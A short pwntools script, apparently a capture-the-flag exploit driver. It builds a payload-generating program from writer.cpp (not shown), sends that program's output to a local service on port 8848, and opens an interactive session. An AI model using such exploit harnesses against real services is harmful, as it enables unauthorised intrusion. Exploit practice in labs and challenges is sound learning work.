from pwn import *
import os
context.log_level="debug"
os.system("g++ writer.cpp -o writer -l protobuf")
sh=process("./writer")
data=sh.recvall()
print(data)
sh.close()
sh=remote("127.0.0.1",8848)
sh.send(data[0:])
sh.interactive()